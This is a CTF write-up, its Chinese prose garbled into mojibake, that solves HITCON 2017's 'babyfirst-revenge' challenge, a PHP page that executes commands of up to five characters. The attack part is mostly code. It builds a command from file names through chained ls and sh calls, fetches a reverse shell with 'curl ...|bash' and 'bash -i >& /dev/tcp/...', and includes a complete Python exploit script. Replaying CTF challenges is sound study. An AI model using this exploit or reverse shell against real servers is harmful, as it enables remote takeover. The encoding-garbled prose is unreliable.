hitconçš„é¢˜å¥½éš¾å•Šï¼ï¼ï¼ï¼ï¼
è¿˜æ˜¯å¤ªèœäº†ã€‚ã€‚Orz
åªèƒ½å¤Ÿèµ›åæ­ç¯å¢ƒå¤ç°äº†ã€‚ã€‚
åˆ†äº«è‡ªåˆ¶Dockerfileï¼š[Github](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge) 

è¿™é¢˜æ˜¯ä¸€ä¸ªç‰¹åˆ«çš„å‘½ä»¤æ‰§è¡Œé¢˜ï¼Œ é¦–å…ˆè¿›å»é¦–é¡µä¹‹åå‘ç°ä»¥ä¸‹æºç 
```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

-----


æ— è®ºæˆ‘ä»¬ä¼ ä»€ä¹ˆè¿›å»ä»–éƒ½ä¼šç…§å•æ‰§è¡Œï¼Œä½†æ˜¯æ¯æ¬¡çš„é•¿åº¦é™åˆ¶ä¸ºæœ€å¤š5ä¸ªå­—ç¬¦ï¼Œæ­£å¸¸æ¥è¯´æœ€çŸ­(?)çš„å†™shellæ–¹å¼åº”è¯¥æ˜¯
```bash
echo x>>1
....
sh 1
```
ä½†æ˜¯å…¶å®æˆ‘ä»¬å¯ä»¥åˆ©ç”¨lsæ¥å†™shellï¼Œå¦‚ä¸‹ï¼š
```bash
>a
ls>_
sh _  #ä¹Ÿå°±æ‰§è¡Œäº†aæŒ‡ä»¤ ä½†æ˜¯æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦æ„é€ ä¸€ç³»åˆ—çš„æŒ‡ä»¤å‡ºæ¥è¿½åŠ åˆ°æ–‡ä»¶é‡Œ
```
é‚£ä¹ˆè¿™é‡Œå°±æ¶‰åŠåˆ°å‡ ä¸ªé—®é¢˜ï¼š
1. lså‡ºæ¥æ˜¯æŒ‰ç…§ä»€ä¹ˆé¡ºåºæ’åˆ—çš„æ–‡ä»¶ï¼Ÿ
2. è¿½åŠ æ–‡ä»¶çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ å…¥æ¢è¡Œ è¿™ä¸ªé—®é¢˜è¦æ€ä¹ˆè§£å†³ï¼Ÿ
3. å¦‚æœlsé€”ä¸­æœ‰æ— ç”¨çš„æ–‡ä»¶æ€ä¹ˆåŠï¼Ÿ å› ä¸ºå¦‚æœæ˜¯ä»¥ä¸Šçš„åšæ³•çš„è¯å…¶å®```cat _```ä½ ä¼šå‘ç°é‡Œé¢è¿˜æœ‰ä¸€ä¸ª```_```æ–‡ä»¶

>ç­”æ¡ˆï¼š
>1. ls -lçš„é»˜è®¤æ’åºæ–¹å¼æ‰‹å†Œä¸Šå†™äº†æ˜¯alphabeticallyï¼ˆå­—å…¸åºï¼‰ä¹Ÿå°±æ˜¯è¯´æœ‰å¯èƒ½åé¢åŠ å…¥çš„æ–‡ä»¶åæ’åœ¨å‰é¢ï¼Œä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜æˆ‘ä»¬å¯ä»¥åŠ å…¥-tå‚æ•°æ¥ä½¿lsä¹‹åçš„ç»“æœæŒ‰ç…§æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶åœ¨å‰é¢çš„æ–¹å¼æ’åˆ—
>2. linuxçš„å‘½ä»¤æ‰§è¡Œä¸­æ”¯æŒå‘½ä»¤æ¢è¡Œ éœ€è¦ç”¨åˆ°åæ–œæ \ å†™åˆ°æœ€åé¢ï¼Œå¦‚ï¼š![ğŸŒ°](http://upload-images.jianshu.io/upload_images/6949366-4ac892737cccb5a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
>3. å…¶å®bashåœ¨æ‰§è¡Œè„šæœ¬çš„æ—¶å€™é‡åˆ°æœªçŸ¥çš„å‘½ä»¤ä¼šæŠ¥é”™ ä½†æ˜¯è¿™å¹¶ä¸ä¼šä½¿ä¹‹é€€å‡ºï¼Œbashä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€è¡Œçš„å‘½ä»¤ï¼Œå¦‚å›¾![ğŸŒ°](http://upload-images.jianshu.io/upload_images/6949366-23d54fedc4febff3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

é‚£åˆ°è¿™é‡Œæ€è·¯å…¶å®å·²ç»æŒºæ¸…æ™°çš„äº†, å°±æ˜¯é€šè¿‡å†™å…¥ä¸€ç³»åˆ—æŒ‡ä»¤çš„åˆ†æ®µï¼Œå¹¶ç”¨åæ–œæ \ä½œä¸ºæ–‡ä»¶ç»“å°¾ï¼Œæœ€åæ‰§è¡Œls -t>gå¹¶ä¸”sh gæ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æŒ‡ä»¤ï¼Œè¿™é‡Œä»¥æ‰§è¡Œåå¼¹shellä¸ºä¾‹ï¼š

```bash
curl 10.188.2.20|bash
```
æˆ‘çš„10.188.2.20/index.htmlæ–‡ä»¶å†…å®¹ä¸º:
```bash
bash -i >& /dev/tcp/10.188.2.20/12345 0>&1
```

- å†™å…¥ ls -t>gæŒ‡ä»¤åˆ°_æ–‡ä»¶
```bash
?cmd=>ls\\    #åˆ›å»ºls\
?cmd=ls>_    #åˆ›å»º _ æ–‡ä»¶ æ–‡ä»¶å†…å®¹ä¸º_ \n ls\ \n
?cmd=>\ \\    #åˆ›å»º \ç©ºæ ¼ æ–‡ä»¶
?cmd=>-t\\    #åˆ›å»º -t\ æ–‡ä»¶
?cmd=>\>g    #åˆ›å»º >g æ–‡ä»¶
?cmd=ls>>_   #å°†åˆšåˆšåˆ›å»ºçš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸åºå†™å…¥_æ–‡ä»¶ è¿™é‡Œçš„å­—å…¸åºæ˜¯ç‰¹æ®Šç¬¦å·åœ¨ls\çš„å‰é¢ æ‰€ä»¥åœ¨ç”Ÿæˆls\ä¹‹åæˆ‘ä»¬è¦å…ˆls>_ ä¿è¯ls\åœ¨æœ€å‰é¢
```

æœ€åç”Ÿæˆçš„_æ–‡ä»¶ç»“æœå¦‚å›¾ï¼š
![_ æ–‡ä»¶](http://upload-images.jianshu.io/upload_images/6949366-621edcef6a1461e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

æœ€åæˆ‘ä»¬éœ€è¦ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤çš„æ—¶å€™ç›´æ¥sh _å°±å¯ä»¥åœ¨gæ–‡ä»¶é‡Œé¢ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤äº† ç„¶åå†sh gå°±å¯ä»¥rceäº†

æ¯”å¦‚æˆ‘è¦æ‰§è¡Œ curl 10.188.2.20|bash (index.htmlå·²ç»æå‰æ”¾å¥½åå¼¹shellçš„å‘½ä»¤)

å› ä¸ºè¿™æ˜¯æŒ‰ç…§æ—¶é—´å€’å™ls æ‰€ä»¥æˆ‘è¦å€’ç€ç”Ÿæˆæˆ‘è¦æ‰§è¡Œçš„æŒ‡ä»¤æ–‡ä»¶ï¼Œæ¯”å¦‚orangeå¤§å¤§çš„expï¼š

```python
import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl orange.tw.tw|python`
    # generate `curl 10.188.2.20|bash` 
    '>sh\ ', 
    '>ba\\', 
    '>\|\\',
    '>20\\',
    '>2.\\', 
    '>8.\\',
    '>18\\', 
    '>0.\\', 
    '>1\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # exec
    'sh _', 
    'sh g', 
]



r = requests.get('http://10.188.2.20:22460/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://10.188.2.20:22460/?cmd=' + quote(i) )
    print i
    sleep(0.2)
```
åœ¨ç”Ÿæˆè‡ªå·±çš„å‘½ä»¤æ—¶è¦æ³¨æ„å„ä¸ªå‘½ä»¤æ®µä¹‹é—´åå­—ä¸èƒ½ç›¸åŒ å› ä¸ºä¸èƒ½ç”Ÿæˆä¸¤ä¸ªå¸¦æœ‰ç›¸åŒå‘½ä»¤æ®µçš„æ–‡ä»¶å


//å·æ‡’å·äº†å¥½ä¹…æ‰å¤ç°çš„ã€‚ã€‚Orzã€‚ã€‚ã€‚ã€‚æ‰¹è¯„ä¸€ä¸‹è‡ªå·±çš„æ‡’æƒ°ã€‚ã€‚
å„ä½å¤§ä½¬æœ‰å•¥æ›´å¥½çš„æ€è·¯æ¬¢è¿åˆ†äº«